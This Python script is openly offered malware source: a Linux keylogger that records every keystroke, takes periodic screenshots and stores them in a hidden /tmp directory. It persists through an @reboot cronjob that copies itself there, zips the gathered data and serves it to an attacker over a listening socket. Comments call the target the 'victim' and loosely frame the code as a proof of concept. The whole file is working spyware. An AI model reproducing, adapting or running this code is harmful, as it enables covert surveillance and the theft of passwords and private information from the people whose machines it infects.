#!/usr/bin/env python3
'''
----------------------------------------------------------------------------------------------------
THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE... HAHA!!

Author : Alexis Rodriguez

Start date : 2020-02-09
End date : 2020-02-18
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Decrypt me %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Description : VGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQgb24gYSBrZXlib2FyZCwgdGFrZXMgYSBzY3JlZW5za
G90IG9mIHRoZSB2aWN0aW1zIHNjcmVlbiwgYW5kIGJpbmRzIGEgc2VydmVyIHNvY2tldCB0byB0cmFuc2ZlciBhIHppcCBmaWxlIG9mIGFsbCB0aGUg
Z2F0aGVyZWQgZGF0YSBvdmVyIGEgc29ja2V0IGNvbm5lY3Rpb24uIFRoZSBrZXkgdGV4dCBmaWxlIGlzIHVwZGF0ZWQgZXZlcnkgMjAgc2Vjb25kcyB
hbmQgdGhlIHNjcmVlbiBjYXB0dXJlIG9jY3VycyBldmVyeSAyIG1pbnV0ZXMuIEFzIG9mIHJpZ2h0IG5vdyB0aGlzIHByb2dyYW0gd2lsbCBvbmx5IH
dvcmsgb24gTGludXggbWFjaGluZXMgYnV0IHdpbGwgYmUgdXBkYXRlZCBpbiB0aGUgbmVhciBmdXR1cmUgZm9yIFdpbmRvd3MgbWFjaGluZXMgdG9vLg==

			None of the art was made by me!!! I wish I had art skills haha		  
			  ___   _      ___   _      ___   _      ___   _      ___   _
			 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
			  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
			 /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
			       |____________|____________|____________|____________|
			                             |            |            |
			                         ___  \\_      ___  \\_      ___  \\_
			                        [(_)] |=|    [(_)] |=|    [(_)] |=|
			                         '-`  |_|     '-`  |_|     '-`  |_|
			                        /mmm/        /mmm/        /mmm/
					                  !
----------------------------------------------------------------------------------------------------
'''

# import module to zip files
from zipfile import ZipFile
# import module to run functions at specific times
import threading
# import socket to initialize socket for file transfer
import socket as sck
# import os and time for file path work and naming files
import os, time
# import subprocess to execute terminal commands
import subprocess as subp

'''
install dependency if necessary
'''
def install_dependency(module_name):
  # attempt to download python's package installer
  subp.call('sudo apt install python3-pip', shell=True)
  # downloading module
  subp.call('pip3 install ' + module_name, shell=True)
  # wait 30 seconds for download to complete
  time.sleep(30)

'''
The following dependencies may not be installed by default
so try importing them and if it fails, attempt
to download them using pythons package installer
*NOTE* - downloading these modules depends on the user's privileges,
and of course I am assuming someone utilizing a keylogger has already
found a way to upload malicious files onto a victim's computer
and has aptly obtained root/admin privileges, though as a proof
of concept downloading these modules manually will do no harm
'''
try:
  # module to take screenshot
	import pyautogui as pygrab
except:
	subp.call('sudo apt install python3-tk python3-dev', shell=True)
	# attempt to install dependency
	install_dependency('pyautogui')
	# try importing module after attempting download
	import pyautogui as pygrab
try:
  # module to capture keystrokes
	from pynput import keyboard
except:
	# attempt to install dependency
	install_dependency('pynput')
	subp.call('sudo apt install scrot', shell=True)
	# try importing module after attempting download
	from pynput import keyboard
	

'''************************************************************'''
''' 					   CLASS DEFINITION    '''
'''************************************************************'''
class Keylogger:
	# invoking the constructor
	def __init__(self):
		self.log = ''
		# create cronjob
		self.create_cronjob()
		# get path of where the initial file was downloaded
		self.initial_file_path = os.getcwd()
		# get /tmp folder name
		self.directory = self.make_get_dir()

	'''
	Begin capturing keystrokes, taking screenshots, and opening socket connection
	'''
	def start_listening(self):
		with keyboard.Listener(
			on_press=self.on_press) as listener:
			# begin logging to txt file
			self.log_to_file()
			# begin taking screen shots
			self.save_screen()
			# listen for socket connections and send at zipped file
			self.socket_listen_send()
			listener.join()

	'''
	make directory in /tmp folder
	'''
	def make_get_dir(self):
		# try making directory
		try:
			# folder is hidden!!! do ls -ltra
			dir_to_create = '/tmp/.folder/'
			os.mkdir(dir_to_create)
		# if it already exists do nothing
		except OSError:
			pass
		# return the name of the directory created
		return dir_to_create

	'''
	Handles the action taken when a 
	key is pressed.
	'''
	def on_press(self, key):
		# try casting key as string
		try:
			self.log += str(key.char)
		# handling special characters
		except AttributeError:
			# if person presses space
			if key == key.space:
				self.log += ' '
				# if person presses enter
			elif key == key.enter: self.log += '\n'
			# if person presses backspace
			elif key == key.backspace: self.log += ''
			# if person presses control key
			elif key == key.ctrl: self.log += ' ctrl+'
			# if person presses tab
			elif key == key.tab: self.log += '\t'
			else:
				self.log += str(key)

	'''
	Logging to a file every 20 seconds
	'''
	def log_to_file(self):
		# open file
		f = open(self.make_get_dir() + 'log.txt', 'w')
		# write self.log to file
		f.write(self.log)
		# every 20 seconds invoke this function
		clock = threading.Timer(20, self.log_to_file)
		# begin clock
		clock.start()

	'''
	get time image was taken append it to 
	the name of the images file
	'''
	def make_name(self):
		# seconds since the creation of python
		seconds_since_epoch = time.time()
		# return full date into a list
		date = time.ctime(seconds_since_epoch).split()
		# return the desired parts of the date list
		return date[1] + '-' + date[2] + '-' + date[3]

	'''
	Take a screenshot of the victions computer
	every 2 minutes and save it to /tmp/.folder directory
	'''
	def save_screen(self):
		# take a screenshot
		image = pygrab.screenshot()
		# get time to append to image file name
		time = self.make_name()
		# save image to the directory that was created
		image.save(r'/tmp/.folder/normal_'+time+'.png')
		# repeat function every two minutes
		take_screen = threading.Timer(120, self.save_screen)
		# begin timer
		take_screen.start()

	'''
	Zip folder contents before sending as email
	Param : directory of folder location
	'''
	def zip_folder(self):
		# list to contain all path of files to zip
		file_paths = []
		zip_name = 'zipped_file.zip'
		# os.walk returns current_path, directories in current_path,
		# files in current_path
		for root, _, files in os.walk(self.directory):
			for file in files:
				# joining absolute path with file name
				filepath = os.path.join(root, file)
				# append filepath to list containing all file paths
				file_paths.append(filepath)

		# creating zipped file
		with ZipFile('/tmp/.folder/' + zip_name, 'w') as zipped:
			# for every file in list of file paths,
			# add file to zip file
			for file in file_paths:
				zipped.write(file)

		return zip_name
	'''
	send the zipped folder to the attacker
	Param : zipped file created by zip_folder function
	'''
	def socket_listen_send(self):
		# zip file composed of folders contents
		ziped_name = self.zip_folder()
		# rewrite existing zip file with new contents
		zip_restart = threading.Timer(10, self.zip_folder)
		# start zipping clock
		zip_restart.start()
		# creating socket context manager
		with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as soc:
			# get IP address of victim and assign listening port
			IP=sck.gethostbyname(sck.gethostname())
			PORT=12345

			# bind socket to victim IP address and port
			soc.bind((IP, PORT))
			# listen for incoming connections
			soc.listen(5)
			# accept and receive connection
			connection, address = soc.accept()
			# open file to read as bytes
			with open('/tmp/.folder/' + ziped_name, 'rb') as zip_file:
				# read bytes from file
				content = zip_file.read()
				# send bytes data over socket
				connection.send(content)

	'''
	Create cronjob to startup keyself.logger after reboot
	'''
	def create_cronjob(self):
		# echo cronjob command into file
		subp.call(['echo @reboot /tmp/.folder/run.py > my-crontab'], shell=True)
		# update crontab with the command in my conjob file
		subp.call(['crontab', 'my-crontab'])

	'''
	replicate keylogger in /tmp/folder to
	continue to activate keylogger after reboot
	'''
	def replicate(self):
		# create file run.py in location of collected data
		subp.call(['touch', self.directory + '/run.py'])
		# copy contents of keylog py file over to /tmp
		# to make sure cronjob finds python file to interpret
		subp.call(['cp', self.initial_file_path + '/keylogger.py', self.directory + 'run.py'])

'''
*************
MAIN IS HERE!
*************
'''
def initiate():
	# instantiating Keylogger object
	my_obj = Keylogger()
	# invoke this function to begin listening
	my_obj.start_listening()
	# get path of where the initial file was downloaded
	# replicate the initial file into the /tmp/.folder
	# to continue to execute keylogger after reboot
	my_obj.replicate()
	# listen for socket connections and send at zipped file
	my_obj.socket_listen_send()


if __name__ == '__main__':
	print('''
			PYTHON KEYLOGGER 2020
. -------------------------------------------------------------------.        
| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
|                                                                    |        
| [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
| [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
| [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
| [^][\\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
`--------------------------------------------------------------------'        
	''')

	initiate()
